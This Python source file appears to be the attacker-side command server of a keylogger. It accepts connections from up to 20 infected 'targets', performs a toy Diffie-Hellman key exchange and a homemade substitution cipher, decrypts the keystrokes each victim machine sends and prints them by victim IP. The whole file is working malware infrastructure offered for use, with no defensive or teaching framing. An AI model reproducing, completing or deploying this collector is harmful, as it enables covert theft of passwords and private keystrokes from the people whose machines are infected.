import socket
import random
import threading, queue
import sys
from signal import signal, SIGINT
import time


#CIPHER
def encrypt(message, key, const):
    text = list(message)
    j = 1
    for index_letter in range(len(text)):
        character = key.find(text[index_letter])
        if character < 0:
            pass
        else:
            text[index_letter] = key[(character + const + j) % len(key)]
        j += const
    return "".join(text)


def decrypt(message, key, const):
    text = list(message)
    j = 1
    for index_letter in range(len(text)):
        character = key.find(text[index_letter])
        if character < 0:
            pass
        else:
            for i in range(len(key)):
                indice = (const + j + i) % len(key)
                if  indice == character:
                    text[index_letter] = key[i]
                    break
        j += const
    return "".join(text)


def generate_key(list_characters=None, seed=0):
    if list_characters is None:
        list_characters = [chr(char) for char in range(5, 256)]
        if seed % len(list_characters) == 0: #evita que la constante sea multiplo de la longitud de la clave, porque si no siempre un caracter tendria el mismo valor
            seed-=1
    random.seed(seed)
    random.shuffle(list_characters)
    return "".join(list_characters), seed


def generate_int(num_digits):
    return int(random.random()*10**num_digits)


def diffie_hellman(cxn): #simulates the diffie hellman algorithm generating short numbers for key exchange
    p = generate_int(random.randint(5,10))*2+1
    k = generate_int(random.randint(2,4))
    x = generate_int(random.randint(2,4))
    A = k**x%p
    cxn.send(f"{str(p)}\x03{str(k)}\x03{str(A)}".encode())
    B = int(cxn.recv(128).decode())
    return B**x%p



#KEYLOGGER SERVER
class keyloggergerServer:

    def __init__(self, host, port):
        self.my_socket = self.socket_config(host, int(port))
        self.targets = dict()
        self.q = queue.Queue(0)

    def socket_config(self, host, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((host, port))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #UNIX
        s.listen(20)
        return s

    def wait_connection(self):
        try:
            while True:
                if len(self.targets) < 20:
                    cxn, address = self.my_socket.accept()
                    const_to_decrypt = diffie_hellman(cxn)
                    key, const_to_decrypt = generate_key(seed=const_to_decrypt)
                    self.targets[address[0]] = dict(zip(["port","cxn","key","const"], [address[1], cxn, key, const_to_decrypt]))
                    self.recv_word(address[0])
                time.sleep(0.05)
        except Exception as err:
            print(f"ERROR: {err}")

    def recv_word(self, ip):
        try:
            word = self.targets[ip]["cxn"].recv(5120).decode("utf-8")
            word = decrypt(word, self.targets[ip]["key"], self.targets[ip]["const"])
            host_and_word = [ip, word]
            self.q.put(host_and_word)
        except Exception as err:
            print(f"Target[{ip}->{self.targets[ip]['port']}]>>> {err}")
            if self.targets.get(ip, -1) != -1:
                del self.targets[ip]

    def shutdown(self, sig_recv, frame):

        for ip in self.targets:
            if self.targets.get(ip,-1) != -1:
                self.targets[ip]["cxn"].close()
                print(f"Target[{ip}->{self.targets[ip]['port']}]>>> closed")
        del self.targets
        self.my_socket.close()
        print("[-] Server Closed")
        exit(0)


def main():
    print("Ctrl-c to stop!")
    keylogger = keyloggergerServer(sys.argv[1], sys.argv[2])
    signal(SIGINT, keylogger.shutdown)
    threading.Thread(target=keylogger.wait_connection, args=(), daemon=True).start()
    while True:
        if not keylogger.q.empty():
            word_of = keylogger.q.get()  
            if word_of[1] == "":  #Failed Connection
                print(f"{word_of[0]}->{keylogger.targets[word_of[0]]['port']}>>> closed")
                del keylogger.targets[word_of[0]]
            else:
                threading.Thread(target=keylogger.recv_word, args=(word_of[0],), daemon=True).start()
                print(rf"Target[{word_of[0]}->{keylogger.targets[word_of[0]]['port']}]>>> {word_of[1]}")
            time.sleep(0.01)
        time.sleep(0.01)

if __name__ == "__main__":
    try:
        main()
    except IndexError:
        print("[-] ERROR: missing IP and port. Run -> python keylogger_attacker.py <ip> <port>")
